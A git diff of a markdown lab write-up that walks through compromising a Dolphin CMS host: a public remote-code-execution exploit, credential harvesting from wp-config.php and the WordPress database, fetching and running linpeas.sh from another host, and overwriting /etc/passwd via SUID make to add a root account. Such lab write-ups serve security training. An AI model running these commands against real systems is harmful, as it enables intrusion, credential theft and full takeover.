@@ -47,7 +47,7 @@ Reminder:
 1. Check all the version
 2. Check all the open ports
 
-[Results](ss/1.png)
+![Results](ss/1.png)
 
 Results
 - Port 21/TCP — FTP service identified
@@ -63,14 +63,14 @@ ftp $ip
 anonymous::anonymous
 ```
 
-[Results](ss/2.png)
+![Results](ss/2.png)
 
 Results: Anonymous login was denied. The FTP service was noted as a potential attack surface but was deprioritised in favour of the HTTP service.
 ## Web Enumeration
 
 Web App page: **The primary web application on port 80 was identified as Dolphin CMS.**
 
-[Results](ss/3.png)
+![Results](ss/3.png)
 
 Web directory brute-forcing was conducted using Gobuster and dirsearch to identify hidden content and administrative interfaces.
 
@@ -84,7 +84,7 @@ dirsearch -u $ip
 
 Gobuster:
 
-[Results](ss/4.png)
+![Results](ss/4.png)
 
 Directory Discovered:
 
@@ -95,7 +95,7 @@ Directory Discovered:
 
 /administration:
 
-[Results](ss/5.png)
+![Results](ss/5.png)
 
 The presence of a WordPress installation prompted further targeted enumeration using WPScan
 
@@ -117,7 +117,7 @@ Searchsploit was used to search for known vulnerabilities in Dolphin CMS
 searchsploit dolphin 
 ```
 
-[Results](ss/7.png)
+![Results](ss/7.png)
 
 Results: 
 - EDB-ID 40756 — Dolphin CMS Unauthenticated Remote Code Execution
@@ -132,7 +132,7 @@ searchsploit -m 40756
 python2 40756.py http://10.11.1.58
 ```
 
-[Results](ss/6.png)
+![Results](ss/6.png)
 
 Results: **The exploit successfully delivered a web shell, resulting in remote command execution on the target system as the www-data user. Initial shell access was confirmed.**
 
@@ -157,7 +157,7 @@ During file system enumeration, the WordPress configuration file was inspected. 
 cat /var/www/html/wordpress/wp-config.php
 ```
 
-[Results](ss/8.png)
+![Results](ss/8.png)
 
 Results: Database credentials were discovered in cleartext:
 
@@ -176,7 +176,7 @@ show tables;
 SELECT user_login, user_pass FROM wp_users;
 ```
 
-[Results](ss/9.png)
+![Results](ss/9.png)
 
 Results: A WordPress user account was retrieved with a phpass-format password hash. The hash was extracted for offline cracking attempts.
 ## Password Cracking
@@ -200,7 +200,7 @@ wget http://172.16.1.2/linpeas.sh && chmod +x linpeas.sh
 ./linpeas.sh
 ```
 
-[Results](ss/10.png)
+![Results](ss/10.png)
 
 Results: LinPEAS identified a critical SUID misconfiguration: /usr/bin/make was configured with the SUID bit set, allowing execution with elevated privileges.
 
@@ -219,7 +219,7 @@ make -s --eval='$(file >/etc/passwd,hacker:MViEYUA3.VKek:0:0:root:/root:/bin/bas
 cat /etc/passwd
 ```
 
-[Results](ss/11.png)
+![Results](ss/11.png)
 
 Results: The /etc/passwd file was successfully overwritten to include a new account (hacker) with UID 0 (root-equivalent), password hash MViEYUA3.VKek, and a bash login shell. The write operation succeeded due to the SUID bit granting elevated file system permissions.
 
@@ -234,7 +234,7 @@ id
 cat /root/key.txt
 ```
 
-[Results](ss/12.png)
+![Results](ss/12.png)
 
 Results: Full root access was confirmed. The root flag was successfully retrieved from /root/key.txt, completing the machine
 
